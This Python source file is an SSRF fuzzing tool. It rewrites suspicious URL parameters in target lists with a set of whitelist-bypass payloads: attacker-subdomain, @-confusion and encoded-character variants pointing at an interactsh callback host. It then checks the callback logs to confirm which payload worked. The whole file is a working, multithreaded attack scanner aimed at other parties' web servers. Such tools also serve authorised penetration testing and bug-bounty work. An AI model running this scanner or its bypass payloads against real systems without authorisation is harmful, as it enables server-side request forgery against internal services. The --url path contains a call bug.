import regex
import argparse
import requests
import time
import os
import threading
import random

currentPath = os.path.dirname(__file__)
os.chdir(currentPath)

FUZZ_PLACE_HOLDER = '??????'
TIMEOUT_DELAY = 1.75
LOCK = threading.Lock()

parser = argparse.ArgumentParser()
parser.add_argument("--file", "-f", type=str, required=False, help= 'file of all URLs to be tested against SSRF')
parser.add_argument("--url", "-u", type=str, required=False, help= 'url to be tested against SSRF')
parser.add_argument("--threads", "-n", type=int, required=False, help= 'number of threads for the tool')
parser.add_argument("--output", "-o", type=str, required=False, help='output file path')
parser.add_argument("--oneshot", "-t", action='store_true', help='fuzz with only one basic payload - to be activated in case of time constraints')
parser.add_argument("--verbose", "-v", action='store_true', help='activate verbose mode')


args = parser.parse_args()

if not (args.file or args.url):
    parser.error('No input selected: Please add --file or --url as arguments.')

if not os.path.isdir('output'):
    os.system("mkdir output")

if not os.path.isdir('output/threadsLogs'):
    os.system("mkdir output/threadsLogs")
else:
    os.system("rm -r output/threadsLogs")
    os.system("mkdir output/threadsLogs")

if args.output:
    outputFile = open(args.output, "a")
else:
    outputFile = open("output/ssrf-result.txt", "a")

if args.file :
    allURLs = [line.replace('\n', '') for line in open(args.file, "r")]

regexMultipleParams = '(?<=(access|admin|dbg|debug|edit|grant|test|alter|clone|create|delete|disable|enable|exec|execute|load|make|modify|rename|reset|shell|toggle|adm|root|cfg|dest|redirect|uri|path|continue|url|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|show|navigation|open|file|document|folder|pg|php_path|style|doc|img|filename)=)(.*)(?=&)'

regexSingleParam = '(?<=(access|admin|dbg|debug|edit|grant|test|alter|clone|create|delete|disable|enable|exec|execute|load|make|modify|rename|reset|shell|toggle|adm|root|cfg|dest|redirect|uri|path|continue|url|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|show|navigation|open|file|document|folder|pg|php_path|style|doc|img|filename)=)(.*)'


extractInteractionServerURL = "(?<=] )([a-z0-9][a-z0-9][a-z0-9].*)"


def getFileSize(fileID):
    interactionLogs = open(f"output/threadsLogs/interaction-logs{fileID}.txt", "r")
    return len(interactionLogs.read())

def getInteractionServer():

    id = random.randint(0,999999)
    os.system(f"./tools/interactsh-client -pi 1 &> output/threadsLogs/interaction-logs{id}.txt &")
    time.sleep(3)
    interactionLogs = open(f"output/threadsLogs/interaction-logs{id}.txt", "r")
    fileContent = interactionLogs.read()
    pastInteractionLogsSize = len(fileContent)
    interactionServer = regex.search(extractInteractionServerURL, fileContent).group()

    return interactionServer, id


def exception_verbose_message(exceptionType):
    if args.verbose:
        if exceptionType == "timeout":
            print("\nTimeout detected... URL skipped")
        elif exceptionType == "redirects":
            print("\nToo many redirects... URL skipped")
        elif exceptionType == "others":
            print("\nRequest error... URL skipped")

def splitURLS(threadsSize): #Multithreading

    splitted = []
    URLSsize = len(allURLs)
    width = int(URLSsize/threadsSize)
    if width == 0:
        width = 1
    endVal = 0
    i = 0
    while endVal != URLSsize:
        if URLSsize <= i + 2 * width:
            if len(splitted) == threadsSize - 2:
                endVal = int(i + (URLSsize - i)/2)
            else:
                endVal = URLSsize
        else:
            endVal = i + width

        splitted.append(allURLs[i: endVal])
        i += width

    return splitted


def generatePayloads(whitelistedHost, interactionHost):
    generated =[
    f"http://{interactionHost}",
    f"//{interactionHost}",
    f"http://{whitelistedHost}.{interactionHost}",       # whitelisted.attacker.com
    f"http://{interactionHost}?{whitelistedHost}",
    f"http://{interactionHost}/{whitelistedHost}",
    f"http://{interactionHost}%ff@{whitelistedHost}",
    f"http://{interactionHost}%ff.{whitelistedHost}",
    f"http://{whitelistedHost}%25253F@{interactionHost}",
    f"http://{whitelistedHost}%253F@{interactionHost}",
    f"http://{whitelistedHost}%3F@{interactionHost}",
    f"http://{whitelistedHost}@{interactionHost}",
    f"http://foo@{interactionHost}:80@{whitelistedHost}",
    f"http://foo@{interactionHost}%20@{whitelistedHost}",
    f"http://foo@{interactionHost}%09@{whitelistedHost}"
    ]
    return generated

def smart_extract_host(url, matchedElement):
    urlDecodedElem = requests.utils.unquote(matchedElement)
    hostExtractorRegex = '(?<=(https|http):\/\/)(.*?)(?=\/)'
    extractedHost = regex.search(hostExtractorRegex, urlDecodedElem)
    if not extractedHost:
        extractedHost = regex.search(hostExtractorRegex, url)

    return extractedHost.group()

def prepare_url_with_regex(url):

    replacedURL = regex.sub(regexMultipleParams, FUZZ_PLACE_HOLDER, url, flags=regex.IGNORECASE)
    if replacedURL == url: #If no match with multiparam regex
        replacedURL = regex.sub(regexSingleParam, FUZZ_PLACE_HOLDER, url, flags=regex.IGNORECASE)
        matchedElem = regex.search(regexSingleParam, url, regex.IGNORECASE)
    else:
        matchedElem = regex.search(regexMultipleParams, url, regex.IGNORECASE)

    if matchedElem:
        matchedElem = matchedElem.group()

    return replacedURL, matchedElem

def fuzz_SSRF(url, interactionServer, fileID):

    pastInteractionLogsSize = getFileSize(fileID)

    replacedURL, matchedElem = prepare_url_with_regex(url)

    if not matchedElem: #No relevant parameter matching
        return

    if args.oneshot:
        payloadsList = [f"http://{interactionServer}"]
    else:
        host = smart_extract_host(url, matchedElem)
        payloadsList = generatePayloads(host, interactionServer)

    if args.verbose:
        if not args.threads:
            print(f" + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +")
        print(f"\nStarting fuzzing {replacedURL}")

    for payload in payloadsList:
        fuzz_and_detect_with_payload("FUZZ", replacedURL, payload, fileID)

    time.sleep(2)
    if isInteractionDetected(pastInteractionLogsSize, fileID):
        if args.verbose:
            print(f"\nSSRF identified in {replacedURL}. Determining valid payload ...")
        for payload in payloadsList:
            if fuzz_and_detect_with_payload("DETECT", replacedURL, payload, fileID):
                print(f"SSRF detected in {replacedURL} with payload {payload}.")
                with LOCK:
                    outputFile.write(f"SSRF detected in {replacedURL} with payload {payload}\n")
                return
    else:
        if args.verbose:
            print(f"\nNothing detected for {replacedURL}")

def fuzz_and_detect_with_payload(type ,url, payload, fileID):
    pastInteractionLogsSize = getFileSize(fileID)

    fuzzedUrl = url.replace(FUZZ_PLACE_HOLDER, payload)
    if args.verbose:
        if not args.threads:
            print(f"Testing payload: {payload}                                                          ", end="\r")
    requests.get(fuzzedUrl, timeout=TIMEOUT_DELAY)
    if type == "DETECT":
        time.sleep(2)
        return isInteractionDetected(pastInteractionLogsSize, fileID)

def isInteractionDetected(pastInteractionLogsSize, fileID):
    currentInteractionLogsSize = getFileSize(fileID)

    if currentInteractionLogsSize != pastInteractionLogsSize:
        return True

    return False

def sequential_url_scan(urlList):

    interactionServer, fileID = getInteractionServer()

    for url in urlList:
        try:
            fuzz_SSRF(url, interactionServer, fileID)
        except requests.exceptions.Timeout:
            exception_verbose_message("timeout")
        except requests.exceptions.TooManyRedirects:
            exception_verbose_message("redirects")
        except requests.exceptions.RequestException:
            exception_verbose_message("others")

def main():
    if args.url:
        try:
            fuzz_SSRF(args.url)
        except:
            print("\nInvalid URL")
    elif args.file:

        if not args.threads or args.threads == 1:
            sequential_url_scan(allURLs)

        else:
            workingThreads = []
            split = splitURLS(args.threads)
            for subList in split:
                t = threading.Thread(target=sequential_url_scan, args=[subList])
                t.start()
                workingThreads.append(t)
            for thread in workingThreads:
                thread.join()
    outputFile.close()


if __name__ == '__main__':
    main()
